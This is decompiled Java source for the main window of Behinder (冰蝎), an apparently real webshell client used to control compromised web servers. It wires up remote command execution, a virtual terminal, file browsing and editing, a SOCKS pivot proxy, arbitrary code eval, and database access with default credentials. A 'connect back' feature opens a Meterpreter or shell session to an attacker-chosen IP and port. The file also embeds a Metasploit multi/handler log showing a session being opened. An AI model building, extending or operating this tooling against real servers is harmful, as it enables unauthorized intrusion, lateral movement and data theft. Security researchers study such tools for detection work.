//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package net.rebeyond.behinder.ui;

import net.rebeyond.behinder.core.ShellService;
import net.rebeyond.behinder.utils.Constants;
import net.rebeyond.behinder.utils.ProxyUtils;
import net.rebeyond.behinder.utils.Utils;
import org.eclipse.swt.browser.Browser;
import org.eclipse.swt.custom.StackLayout;
import org.eclipse.swt.custom.StyledText;
import org.eclipse.swt.custom.VerifyKeyListener;
import org.eclipse.swt.events.*;
import org.eclipse.swt.graphics.Image;
import org.eclipse.swt.layout.FillLayout;
import org.eclipse.swt.layout.GridData;
import org.eclipse.swt.layout.GridLayout;
import org.eclipse.swt.widgets.*;
import org.json.JSONObject;
import swing2swt.layout.BorderLayout;

import java.io.ByteArrayInputStream;
import java.util.HashMap;
import java.util.Map;

public class MainShell extends Shell {
    public JSONObject currentShell;
    public ShellService currentShellService;
    private ProxyUtils proxyUtils;
    public Map<String, String> basicInfoMap = new HashMap();
    private Text urlTxt;
    private Text cmdview;
    private Table fileTable;
    private Text IPTxt;
    private Text msfTipsTxt;
    private Text connStrTxt;
    private Table dataTable;
    private Text sqlTxt;
    private Label connectStatus;
    private Tree dirTree;
    public Label statusLabel;
    private Tree dataTree;
    private Button btnShell;
    private Button btnMeter;
    private Text portTxt;
    private Button connectBackBtn;
    private Text bindAddressTxt;
    private Text bindPortTxt;
    private StyledText proxyLogTxt;
    private StyledText sourceCodeTxt;
    private StyledText evalResultTxt;
    private Text memoTxt;
    private StyledText realCmdView;
    private Text imagePathTxt;
    private Text fileContentTxt;
    private Composite composite_7;
    private Composite composite_8;
    private Text filePathTxt;
    private Combo charsetCombo;
    private Combo dataTypeComb;
    public DBManagerUtils DBManagerUtils;
    public FileManagerUtils FileManagerUtils;
    public CmdUtils CmdUtils;
    public EvalUtils EvalUtils;
    public ConnectBackUtils ConnectBackUtils;
    private TabItem updateInfoTab;
    private Browser updateInfoBrowser;
    private Combo currentPathCombo;
    private TabItem reverseTab;
    private TabItem socksProxyTab;
    private TabItem realCmdTab;

    public static void main(String[] args) {
    }

    public MainShell(Display display, final JSONObject shellEntity) {
        super(display, 1264);
        this.setLayout(new BorderLayout(0, 0));
        Group grpStatus = new Group(this, 0);
        grpStatus.setText("状态");
        grpStatus.setLayoutData("South");
        grpStatus.setLayout(new GridLayout(4, false));
        this.statusLabel = new Label(grpStatus, 0);
        this.statusLabel.setLayoutData(new GridData(4, 16777216, true, false, 1, 1));
        Label versionLabel = new Label(grpStatus, 0);
        versionLabel.setText(String.format("冰蝎 %s", Constants.VERSION));
        versionLabel.setLayoutData(new GridData(131072, 16777216, false, false, 1, 1));
        Label label_1 = new Label(grpStatus, 2);
        GridData layoutData = new GridData();
        layoutData.heightHint = 20;
        label_1.setLayoutData(layoutData);
        Label authorLabel = new Label(grpStatus, 0);
        authorLabel.setText("By rebeyond");
        TabFolder tabFolder = new TabFolder(this, 0);
        tabFolder.setLayoutData("Center");
        TabItem basicTab = new TabItem(tabFolder, 0);
        basicTab.setText("基本信息");
        final Browser baseInfoView = new Browser(tabFolder, 0);
        baseInfoView.setJavascriptEnabled(false);
        basicTab.setControl(baseInfoView);
        TabItem cmdTab = new TabItem(tabFolder, 0);
        cmdTab.setText("命令执行");
        this.cmdview = new Text(tabFolder, 2626);
        this.cmdview.addFocusListener(new FocusAdapter() {
            public void focusGained(FocusEvent arg0) {
                MainShell.this.CmdUtils.currentPos = MainShell.this.cmdview.getCharCount();
            }
        });
        this.cmdview.addKeyListener(new KeyAdapter() {
            public void keyPressed(KeyEvent e) {
                try {
                    MainShell.this.CmdUtils.sendCommand(e, MainShell.this.cmdview, MainShell.this);
                } catch (Exception var3) {
                    var3.printStackTrace();
                    MainShell.this.statusLabel.setText("发生异常：" + var3.getMessage());
                }

            }
        });
        this.cmdview.setForeground(Display.getDefault().getSystemColor(5));
        this.cmdview.setBackground(Display.getDefault().getSystemColor(21));
        cmdTab.setControl(this.cmdview);
        this.realCmdTab = new TabItem(tabFolder, 0);
        this.realCmdTab.setText("虚拟终端");
        Composite composite_6 = new Composite(tabFolder, 0);
        this.realCmdTab.setControl(composite_6);
        composite_6.setLayout(new GridLayout(3, false));
        Label imagePathLabel = new Label(composite_6, 0);
        imagePathLabel.setLayoutData(new GridData(131072, 16777216, false, false, 1, 1));
        imagePathLabel.setText("可执行文件路径：");
        this.imagePathTxt = new Text(composite_6, 2048);
        this.imagePathTxt.setLayoutData(new GridData(4, 16777216, true, false, 1, 1));
        final Button realCmdBtn = new Button(composite_6, 0);

        try {
            Image startImage = new Image(display, new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/start.png")));
            realCmdBtn.setData("start", startImage);
            Image stopImage = new Image(display, new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/stop.png")));
            realCmdBtn.setData("stop", stopImage);
            realCmdBtn.setImage(startImage);
        } catch (Exception var68) {
            var68.printStackTrace();
        }

        realCmdBtn.addSelectionListener(new SelectionAdapter() {
            public void widgetSelected(SelectionEvent e) {
                try {
                    if (realCmdBtn.getText().equals("启动")) {
                        MainShell.this.CmdUtils.createRealCMD(MainShell.this.realCmdView, MainShell.this.imagePathTxt.getText().trim());
                        realCmdBtn.setText("停止");
                        realCmdBtn.setImage((Image) realCmdBtn.getData("stop"));
                    } else if (realCmdBtn.getText().equals("停止")) {
                        MainShell.this.CmdUtils.stopRealCMD(MainShell.this.realCmdView, MainShell.this.imagePathTxt.getText().trim());
                        realCmdBtn.setText("启动");
                        realCmdBtn.setImage((Image) realCmdBtn.getData("start"));
                    }
                } catch (Exception var3) {
                    var3.printStackTrace();
                }

            }
        });
        realCmdBtn.setText("启动");
        this.realCmdView = new CustomStyledText(composite_6, 2818, Constants.MENU_COPY | Constants.MENU_PASTE | Constants.MENU_SELECT_ALL);
        this.realCmdView.addFocusListener(new FocusAdapter() {
            public void focusGained(FocusEvent arg0) {
                MainShell.this.CmdUtils.currentPos = MainShell.this.realCmdView.getCharCount();
            }
        });
        this.realCmdView.setBackground(Display.getDefault().getSystemColor(2));
        this.realCmdView.setForeground(Display.getDefault().getSystemColor(5));
        this.realCmdView.addVerifyKeyListener(new VerifyKeyListener() {
            public void verifyKey(VerifyEvent event) {
                MainShell.this.CmdUtils.filterEvent(MainShell.this.realCmdView, event);
            }
        });
        this.realCmdView.addKeyListener(new KeyAdapter() {
            public void keyPressed(KeyEvent e) {
                try {
                    MainShell.this.CmdUtils.runRealCMD(MainShell.this.realCmdView, e);
                } catch (Exception var3) {
                    var3.printStackTrace();
                }

            }

            public void keyReleased(KeyEvent e) {
            }
        });
        this.realCmdView.setLayoutData(new GridData(4, 4, true, true, 3, 1));
        TabItem fileManagerTab = new TabItem(tabFolder, 0);
        fileManagerTab.setText("文件管理");
        Composite composite = new Composite(tabFolder, 0);
        fileManagerTab.setControl(composite);
        GridLayout gl_composite = new GridLayout(4, true);
        gl_composite.marginWidth = 0;
        gl_composite.marginHeight = 0;
        gl_composite.verticalSpacing = 0;
        composite.setLayout(gl_composite);
        this.dirTree = new Tree(composite, 2048);
        this.dirTree.setLayoutData(new GridData(4, 4, false, true, 1, 1));
        this.dirTree.setLinesVisible(true);
        this.dirTree.addSelectionListener(new SelectionAdapter() {
            public void widgetSelected(SelectionEvent e) {
                try {
                    MainShell.this.FileManagerUtils.expandPathByNode((TreeItem) e.item, MainShell.this.fileTable);
                } catch (Exception var3) {
                    MainShell.this.statusLabel.setText("发生异常：" + var3.getMessage());
                }

            }
        });
        this.composite_7 = new Composite(composite, 0);
        this.composite_7.setLayoutData(new GridData(4, 4, true, true, 3, 1));
        StackLayout sl_composite_7 = new StackLayout();
        this.composite_7.setLayout(sl_composite_7);
        this.composite_7.layout();
        Composite composite_10 = new Composite(this.composite_7, 0);
        composite_10.setLayout(new GridLayout(1, true));
        Composite composite_11 = new Composite(composite_10, 0);
        composite_11.setLayoutData(new GridData(4, 16777216, true, false, 1, 1));
        composite_11.setLayout(new GridLayout(3, false));
        Label currentPathLabel = new Label(composite_11, 0);
        currentPathLabel.setText("路径：");
        currentPathLabel.setBounds(0, 0, 36, 17);
        this.currentPathCombo = new Combo(composite_11, 2048);
        this.currentPathCombo.addSelectionListener(new SelectionAdapter() {
            public void widgetSelected(SelectionEvent arg0) {
                MainShell.this.FileManagerUtils.expandPathByPathString(MainShell.this.currentPathCombo.getText(), MainShell.this.dirTree, MainShell.this.fileTable);
            }
        });
        this.currentPathCombo.setLayoutData(new GridData(4, 16777216, true, false, 1, 1));
        this.currentPathCombo.setBounds(0, 0, 438, 23);
        Button openPathBtn = new Button(composite_11, 0);
        openPathBtn.addSelectionListener(new SelectionAdapter() {
            public void widgetSelected(SelectionEvent arg0) {
                MainShell.this.FileManagerUtils.expandPathByPathString(MainShell.this.currentPathCombo.getText(), MainShell.this.dirTree, MainShell.this.fileTable);
            }
        });
        openPathBtn.setText("打开路径");
        this.fileTable = new Table(composite_10, 67584);
        this.fileTable.setLayoutData(new GridData(4, 4, true, true, 1, 1));
        this.fileTable.setSize(592, 345);
        this.fileTable.addMouseListener(new MouseAdapter() {
            public void mouseDown(MouseEvent e) {
                MainShell.this.FileManagerUtils.showContextMenu(e, MainShell.this.dirTree, MainShell.this.fileTable, MainShell.this.filePathTxt, MainShell.this.fileContentTxt, MainShell.this.charsetCombo);
            }

            public void mouseDoubleClick(MouseEvent e) {
                try {
                    TreeItem currentNode = MainShell.this.dirTree.getSelection()[0];
                    String childDirName = MainShell.this.fileTable.getSelection()[0].getText();
                    if (childDirName.equals("..")) {
                        if (currentNode.getParentItem() != null) {
                            MainShell.this.FileManagerUtils.expandPathByNode(currentNode.getParentItem(), MainShell.this.fileTable);
                        }
                    } else if (childDirName.equals(".")) {
                        MainShell.this.FileManagerUtils.expandPathByNode(currentNode, MainShell.this.fileTable);
                    } else {
                        TreeItem[] var7;
                        int var6 = (var7 = currentNode.getItems()).length;

                        for (int var5 = 0; var5 < var6; ++var5) {
                            TreeItem childItem = var7[var5];
                            if (childItem.getText().equals(childDirName)) {
                                MainShell.this.FileManagerUtils.expandPathByNode(childItem, MainShell.this.fileTable);
                                break;
                            }
                        }
                    }
                } catch (Exception var8) {
                    MainShell.this.statusLabel.setText("目录打开异常:" + var8.getMessage());
                }

            }
        });
        this.fileTable.setLinesVisible(true);
        this.fileTable.setHeaderVisible(true);
        sl_composite_7.topControl = this.fileTable.getParent();
        this.composite_8 = new Composite(this.composite_7, 0);
        this.composite_8.setLayout(new GridLayout(2, true));
        Group composite_9 = new Group(this.composite_8, 0);
        composite_9.setText("文件信息");
        composite_9.setLayout(new GridLayout(3, false));
        composite_9.setLayoutData(new GridData(4, 16777216, true, false, 2, 1));
        Label lblNewLabel_1 = new Label(composite_9, 0);
        GridData gd_lblNewLabel_1 = new GridData(16384, 16777216, false, false, 1, 1);
        gd_lblNewLabel_1.horizontalIndent = 10;
        lblNewLabel_1.setLayoutData(gd_lblNewLabel_1);
        lblNewLabel_1.setText("路径：");
        this.filePathTxt = new Text(composite_9, 2048);
        this.filePathTxt.setEditable(false);
        this.filePathTxt.setLayoutData(new GridData(4, 16777216, true, false, 1, 1));
        this.charsetCombo = new Combo(composite_9, 0);
        this.charsetCombo.setItems(new String[]{"GBK", "UTF-8"});
        this.charsetCombo.addSelectionListener(new SelectionAdapter() {
            public void widgetSelected(SelectionEvent e) {
                try {
                    MainShell.this.FileManagerUtils.showFile(MainShell.this.filePathTxt, MainShell.this.fileContentTxt, MainShell.this.charsetCombo);
                } catch (Exception var3) {
                    var3.printStackTrace();
                }

            }
        });
        GridData gd_charsetCombo = new GridData(16384, 16777216, false, false, 1, 1);
        gd_charsetCombo.horizontalIndent = 10;
        this.charsetCombo.setLayoutData(gd_charsetCombo);
        new Label(this.composite_8, 0);
        new Label(this.composite_8, 0);
        this.fileContentTxt = new Text(this.composite_8, 2882);
        this.fileContentTxt.setLayoutData(new GridData(4, 4, true, true, 2, 1));
        final Button btnNewButton_2 = new Button(this.composite_8, 0);
        GridData gd_btnNewButton_2 = new GridData(131072, 16777216, false, false, 1, 1);
        gd_btnNewButton_2.widthHint = 50;
        btnNewButton_2.setLayoutData(gd_btnNewButton_2);
        btnNewButton_2.addSelectionListener(new SelectionAdapter() {
            public void widgetSelected(SelectionEvent e) {
                StackLayout layout = (StackLayout) btnNewButton_2.getParent().getParent().getLayout();
                layout.topControl = MainShell.this.fileTable.getParent();
                MainShell.this.fileTable.getParent().getParent().layout();
            }
        });
        btnNewButton_2.setText("返回");
        Button btnNewButton_3 = new Button(this.composite_8, 0);
        btnNewButton_3.addSelectionListener(new SelectionAdapter() {
            public void widgetSelected(SelectionEvent e) {
                try {
                    MainShell.this.FileManagerUtils.saveFile(MainShell.this.filePathTxt, MainShell.this.fileContentTxt, MainShell.this.charsetCombo);
                } catch (Exception var3) {
                    var3.printStackTrace();
                }

            }
        });
        GridData gd_btnNewButton_3 = new GridData(16384, 16777216, false, false, 1, 1);
        gd_btnNewButton_3.widthHint = 50;
        btnNewButton_3.setLayoutData(gd_btnNewButton_3);
        btnNewButton_3.setText("保存");
        String[] tableHeader = new String[]{"名称", "大小", "修改时间"};

        for (int i = 0; i < tableHeader.length; ++i) {
            TableColumn tableColumn = new TableColumn(this.fileTable, 0);
            tableColumn.setText(tableHeader[i]);
            tableColumn.setWidth(300);
        }

        this.socksProxyTab = new TabItem(tabFolder, 0);
        this.socksProxyTab.setText("Socks代理");
        Composite composite_4 = new Composite(tabFolder, 0);
        this.socksProxyTab.setControl(composite_4);
        composite_4.setLayout(new GridLayout(1, false));
        Group group_3 = new Group(composite_4, 0);
        group_3.setLayoutData(new GridData(4, 16777216, true, false, 1, 1));
        group_3.setSize(794, 345);
        group_3.setText("连接信息");
        group_3.setLayout(new GridLayout(5, true));
        Label label_7 = new Label(group_3, 0);
        label_7.setLayoutData(new GridData(131072, 16777216, false, false, 1, 1));
        label_7.setText("本地监听地址：");
        label_7.setAlignment(131072);
        this.bindAddressTxt = new Text(group_3, 2048);
        this.bindAddressTxt.setText("0.0.0.0");
        this.bindAddressTxt.setLayoutData(new GridData(4, 16777216, false, false, 1, 1));
        Label label_8 = new Label(group_3, 0);
        label_8.setLayoutData(new GridData(131072, 16777216, false, false, 1, 1));
        label_8.setText("本地监听端口：");
        label_8.setAlignment(131072);
        this.bindPortTxt = new Text(group_3, 2048);
        this.bindPortTxt.setText("10086");
        this.bindPortTxt.setLayoutData(new GridData(4, 16777216, true, false, 1, 1));
        final Button proxyBtn = new Button(group_3, 0);
        proxyBtn.addSelectionListener(new SelectionAdapter() {
            public void widgetSelected(SelectionEvent e) {
                try {
                    if (proxyBtn.getText().equals("开启")) {
                        MainShell.this.proxyUtils = new ProxyUtils(MainShell.this.currentShellService, MainShell.this.bindAddressTxt.getText(), MainShell.this.bindPortTxt.getText(), MainShell.this.proxyLogTxt, MainShell.this.statusLabel);
                        MainShell.this.proxyUtils.start();
                        proxyBtn.setText("关闭");
                    } else {
                        MainShell.this.proxyUtils.shutdown();
                        proxyBtn.setText("开启");
                    }
                } catch (Exception var3) {
                    var3.printStackTrace();
                }

            }
        });
        proxyBtn.setLayoutData(new GridData(16777216, 16777216, false, false, 1, 1));
        proxyBtn.setText("开启");
        Group group_4 = new Group(composite_4, 0);
        group_4.setLayout(new GridLayout(1, false));
        group_4.setLayoutData(new GridData(4, 4, false, true, 1, 1));
        group_4.setText("运行日志");
        this.proxyLogTxt = new StyledText(group_4, 68160);
        this.proxyLogTxt.setLayoutData(new GridData(4, 4, true, true, 1, 1));
        this.reverseTab = new TabItem(tabFolder, 0);
        this.reverseTab.setText("反弹Shell");
        Composite composite_2 = new Composite(tabFolder, 0);
        this.reverseTab.setControl(composite_2);
        composite_2.setLayout(new GridLayout(1, false));
        Group group = new Group(composite_2, 0);
        group.setLayoutData(new GridData(4, 16777216, true, false, 1, 1));
        group.setText("连接信息");
        group.setLayout(new GridLayout(7, true));
        Label lblIp = new Label(group, 0);
        lblIp.setLayoutData(new GridData(131072, 16777216, false, false, 1, 1));
        lblIp.setAlignment(131072);
        lblIp.setText("IP：");
        this.IPTxt = new Text(group, 2048);
        this.IPTxt.setLayoutData(new GridData(4, 16777216, false, false, 1, 1));
        this.IPTxt.setText("192.168.50.53");
        Label lblPort = new Label(group, 0);
        lblPort.setLayoutData(new GridData(131072, 16777216, false, false, 1, 1));
        lblPort.setAlignment(131072);
        lblPort.setText("Port：");
        this.portTxt = new Text(group, 2048);
        this.portTxt.setLayoutData(new GridData(4, 16777216, true, false, 1, 1));
        this.portTxt.setText("4444");
        this.btnMeter = new Button(group, 16);
        this.btnMeter.setSelection(true);
        this.btnMeter.setLayoutData(new GridData(131072, 16777216, false, false, 1, 1));
        this.btnMeter.setText("Meterpreter");
        this.btnShell = new Button(group, 16);
        this.btnShell.addSelectionListener(new SelectionAdapter() {
            public void widgetSelected(SelectionEvent e) {
                if (MainShell.this.btnShell.getSelection()) {
                    BasicInfoUtils.formatPayloadName(shellEntity.getString("type"), MainShell.this.msfTipsTxt, "shell");
                } else {
                    BasicInfoUtils.formatPayloadName(shellEntity.getString("type"), MainShell.this.msfTipsTxt, "meterpreter");
                }

            }
        });
        this.btnShell.setText("Shell");
        this.connectBackBtn = new Button(group, 0);

        try {
            Image reverseImage = new Image(display, new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/reverse.png")));
            this.connectBackBtn.setImage(reverseImage);
        } catch (Exception var67) {
            var67.printStackTrace();
        }

        this.connectBackBtn.addSelectionListener(new SelectionAdapter() {
            public void widgetSelected(SelectionEvent e) {
                String type = MainShell.this.btnShell.getSelection() ? "shell" : "meter";
                String ip = MainShell.this.IPTxt.getText();
                String port = MainShell.this.portTxt.getText();
                MainShell.this.ConnectBackUtils.connectBack(MainShell.this.connectBackBtn, type, ip, port);
            }
        });
        this.connectBackBtn.setLayoutData(new GridData(16777216, 16777216, false, false, 1, 1));
        this.connectBackBtn.setText("给我连");
        Group group_1 = new Group(composite_2, 0);
        group_1.setLayout(new FillLayout(256));
        group_1.setLayoutData(new GridData(4, 4, true, true, 1, 1));
        group_1.setText("提示");
        this.msfTipsTxt = new Text(group_1, 2626);
        this.msfTipsTxt.setText("root@silver:/tmp# msfconsole\r\nmsf > use exploit/multi/handler \r\nmsf exploit(multi/handler) > set payload %s\r\npayload => %s\r\nmsf exploit(multi/handler) > show options\r\n\r\nPayload options (%s):\r\n\r\n   Name   Current Setting  Required  Description\r\n   ----   ---------------  --------  -----------\r\n   LHOST                   yes       The listen address (an interface may be specified)\r\n   LPORT  4444             yes       The listen port\r\n\r\n\r\nExploit target:\r\n\r\n   Id  Name\r\n   --  ----\r\n   0   Wildcard Target\r\n\r\n\r\nmsf exploit(multi/handler) > set lhost 0.0.0.0\r\nlhost => 0.0.0.0\r\nmsf exploit(multi/handler) > exploit \r\n\r\n[*] Started reverse TCP handler on 0.0.0.0:4444 \r\n[*] Sending stage (53859 bytes) to 119.3.72.174\r\n[*] Meterpreter session 1 opened (192.168.0.166:4444 -> 119.3.72.174:47157) at 2018-08-23 11:03:41 +0800\r\n\r\nmeterpreter > ");
        TabItem databaseTab = new TabItem(tabFolder, 0);
        databaseTab.setText("数据库管理");
        Composite composite_3 = new Composite(tabFolder, 0);
        databaseTab.setControl(composite_3);
        composite_3.setLayout(new GridLayout(4, false));
        Group group_2 = new Group(composite_3, 0);
        group_2.setLayoutData(new GridData(4, 16777216, true, false, 4, 1));
        group_2.setText("连接信息");
        GridLayout gl_group_2 = new GridLayout(5, false);
        gl_group_2.verticalSpacing = 3;
        group_2.setLayout(gl_group_2);
        Label label_6 = new Label(group_2, 131072);
        GridData gd_label_6 = new GridData(131072, 16777216, false, false, 1, 1);
        gd_label_6.widthHint = 120;
        label_6.setLayoutData(gd_label_6);
        label_6.setText("数据库类型：");
        this.dataTypeComb = new Combo(group_2, 0);
        this.dataTypeComb.addSelectionListener(new SelectionAdapter() {
            public void widgetSelected(SelectionEvent e) {
                String dataType = MainShell.this.dataTypeComb.getText().toLowerCase();
                if (dataType.equals("mysql")) {
                    MainShell.this.connStrTxt.setText(String.format(MainShell.this.connStrTxt.getData().toString(), dataType, "root", "3306", "mysql"));
                } else if (dataType.equals("sqlserver")) {
                    MainShell.this.connStrTxt.setText(String.format(MainShell.this.connStrTxt.getData().toString(), dataType, "sa", "1433", "master"));
                } else if (dataType.equals("oracle")) {
                    MainShell.this.connStrTxt.setText(String.format(MainShell.this.connStrTxt.getData().toString(), dataType, "sys", "1521", "orcl"));
                }

            }
        });
        this.dataTypeComb.setItems(new String[]{"MySQL", "SQLServer", "Oracle"});
        GridData gd_dataTypeComb = new GridData(16384, 16777216, false, false, 1, 1);
        gd_dataTypeComb.widthHint = 100;
        this.dataTypeComb.setLayoutData(gd_dataTypeComb);
        this.dataTypeComb.select(0);
        Label label_5 = new Label(group_2, 0);
        label_5.setLayoutData(new GridData(131072, 16777216, false, false, 1, 1));
        label_5.setText("连接字符串：");
        label_5.setAlignment(131072);
        this.connStrTxt = new Text(group_2, 2048);
        this.connStrTxt.setText("mysql://root:123456@127.0.0.1:3306/mysql");
        this.connStrTxt.setData("%s://%s:123456@127.0.0.1:%s/%s");
        this.connStrTxt.setLayoutData(new GridData(4, 16777216, true, false, 1, 1));
        Button connBtn = new Button(group_2, 0);
        connBtn.addSelectionListener(new SelectionAdapter() {
            public void widgetSelected(SelectionEvent e) {
                try {
                    MainShell.this.DBManagerUtils.showDatabases(MainShell.this.connStrTxt.getText(), MainShell.this.dataTree, MainShell.this.dataTable);
                } catch (Exception var3) {
                    var3.printStackTrace();
                }

            }
        });
        connBtn.setLayoutData(new GridData(16777216, 16777216, false, false, 1, 1));
        connBtn.setText("连接");
        this.dataTree = new Tree(composite_3, 2048);
        this.dataTree.addMouseListener(new MouseAdapter() {
            public void mouseDown(MouseEvent e) {
                try {
                    MainShell.this.DBManagerUtils.showContextMenu(e, MainShell.this.connStrTxt.getText(), MainShell.this.dataTree, MainShell.this.dataTable);
                } catch (Exception var3) {
                    var3.printStackTrace();
                }

            }
        });
        this.dataTree.addSelectionListener(new SelectionAdapter() {
            public void widgetSelected(SelectionEvent e) {
                TreeItem currentNode = (TreeItem) e.item;
                if (currentNode.getData("type").equals("database")) {
                    MainShell.this.DBManagerUtils.showTables(MainShell.this.connStrTxt.getText(), currentNode, MainShell.this.dataTable);
                } else if (currentNode.getData("type").equals("table")) {
                    MainShell.this.DBManagerUtils.showColumns(MainShell.this.connStrTxt.getText(), currentNode, MainShell.this.dataTable);
                }

            }
        });
        GridData gd_dataTree = new GridData(4, 4, false, true, 1, 2);
        gd_dataTree.widthHint = 200;
        this.dataTree.setLayoutData(gd_dataTree);
        Label lblSql = new Label(composite_3, 0);
        lblSql.setLayoutData(new GridData(131072, 16777216, false, false, 1, 1));
        lblSql.setText("SQL语句：");
        lblSql.setAlignment(131072);
        this.sqlTxt = new Text(composite_3, 2626);
        GridData gd_sqlTxt = new GridData(4, 16777216, true, false, 1, 1);
        gd_sqlTxt.heightHint = 55;
        this.sqlTxt.setLayoutData(gd_sqlTxt);
        Button queryBtn = new Button(composite_3, 0);
        queryBtn.addSelectionListener(new SelectionAdapter() {
            public void widgetSelected(SelectionEvent e) {
                MainShell.this.DBManagerUtils.querySQL(MainShell.this.connStrTxt.getText(), MainShell.this.dataTree, MainShell.this.dataTable, MainShell.this.sqlTxt.getText());
            }
        });
        queryBtn.setText("执行");
        this.dataTable = new Table(composite_3, 67584);
        this.dataTable.setLayoutData(new GridData(4, 4, true, true, 3, 1));
        this.dataTable.setHeaderVisible(true);
        this.dataTable.setLinesVisible(true);
        TabItem evalTab = new TabItem(tabFolder, 0);
        evalTab.setText("自定义代码");
        Composite composite_1 = new Composite(tabFolder, 0);
        evalTab.setControl(composite_1);
        composite_1.setLayout(new GridLayout(3, false));
        Group group_5 = new Group(composite_1, 0);
        group_5.setText("源代码");
        group_5.setLayout(new GridLayout(1, false));
        group_5.setLayoutData(new GridData(4, 4, true, true, 1, 1));
        group_5.setBounds(0, 0, 70, 84);
        this.sourceCodeTxt = new StyledText(group_5, 2816);
        this.sourceCodeTxt.setLayoutData(new GridData(4, 4, true, true, 1, 1));
        final Button btnNewButton = new Button(composite_1, 0);
        btnNewButton.addSelectionListener(new SelectionAdapter() {
            public void widgetSelected(SelectionEvent e) {
                MainShell.this.EvalUtils.execute(btnNewButton, MainShell.this.sourceCodeTxt.getText(), MainShell.this.evalResultTxt);
            }
        });
        btnNewButton.setText("运行");
        Group group_6 = new Group(composite_1, 0);
        group_6.setText("运行结果");
        group_6.setLayout(new GridLayout(1, false));
        group_6.setLayoutData(new GridData(4, 4, true, true, 1, 1));
        this.evalResultTxt = new StyledText(group_6, 2816);
        this.evalResultTxt.setLayoutData(new GridData(4, 4, true, true, 1, 1));
        TabItem memoTab = new TabItem(tabFolder, 0);
        memoTab.setText("备忘录");
        Composite composite_5 = new Composite(tabFolder, 0);
        memoTab.setControl(composite_5);
        composite_5.setLayout(new GridLayout(1, false));
        this.memoTxt = new Text(composite_5, 2882);
        this.memoTxt.addModifyListener(new ModifyListener() {
            public void modifyText(ModifyEvent arg0) {
                try {
                    int shellID = shellEntity.getInt("id");
                    Main.shellManager.updateMemo(shellID, MainShell.this.memoTxt.getText());
                    MainShell.this.statusLabel.setText("备忘录保存成功");
                } catch (Exception var3) {
                    var3.printStackTrace();
                }

            }
        });
        this.memoTxt.setLayoutData(new GridData(4, 4, true, true, 1, 1));
        this.updateInfoTab = new TabItem(tabFolder, 0);
        this.updateInfoTab.setText("更新信息");
        this.updateInfoBrowser = new Browser(tabFolder, 0);
        this.updateInfoTab.setControl(this.updateInfoBrowser);
        Group grpHeader = new Group(this, 0);
        grpHeader.setLayoutData("North");
        GridLayout gl_grpHeader = new GridLayout(3, false);
        gl_grpHeader.marginLeft = 5;
        grpHeader.setLayout(gl_grpHeader);
        Label label = new Label(grpHeader, 0);
        label.setSize(197, 23);
        label.setText("URL:");
        this.urlTxt = new Text(grpHeader, 2048);
        this.urlTxt.setEditable(false);
        this.connectStatus = new Label(grpHeader, 0);
        this.connectStatus.setAlignment(16777216);
        GridData gd_connectStatus = new GridData(16384, 16777216, false, false, 1, 1);
        gd_connectStatus.widthHint = 80;
        this.connectStatus.setLayoutData(gd_connectStatus);
        this.urlTxt.addModifyListener(new ModifyListener() {
            public void modifyText(ModifyEvent arg0) {
                try {
                    BasicInfoUtils.getBasicInfo(shellEntity, baseInfoView, MainShell.this.dirTree, MainShell.this.cmdview, MainShell.this.connectStatus, MainShell.this.memoTxt, MainShell.this.imagePathTxt, MainShell.this.msfTipsTxt, MainShell.this.statusLabel, MainShell.this.sourceCodeTxt, MainShell.this.updateInfoBrowser, MainShell.this.currentPathCombo, MainShell.this.sqlTxt);
                } catch (Exception var3) {
                    MainShell.this.statusLabel.setText("连接异常:" + var3.getMessage());
                }

            }
        });
        this.urlTxt.setLayoutData(new GridData(4, 16777216, true, false, 1, 1));
        this.urlTxt.setSize(196, 23);
        this.urlTxt.setText(shellEntity.getString("url"));
        if (shellEntity.getString("type").toLowerCase().equals("asp")) {
            this.realCmdTab.dispose();
            this.socksProxyTab.dispose();
            this.reverseTab.dispose();
            this.dataTypeComb.removeAll();
            this.dataTypeComb.add("SQLServer");
            this.dataTypeComb.select(0);
            this.connStrTxt.setText("sqlserver://sa:123456@127.0.0.1:1433/master");
        }

        this.createContents();
    }

    protected void createContents() {
        this.setText("SWT Application");
        this.setSize(818, 516);
    }

    protected void checkSubclass() {
    }
}
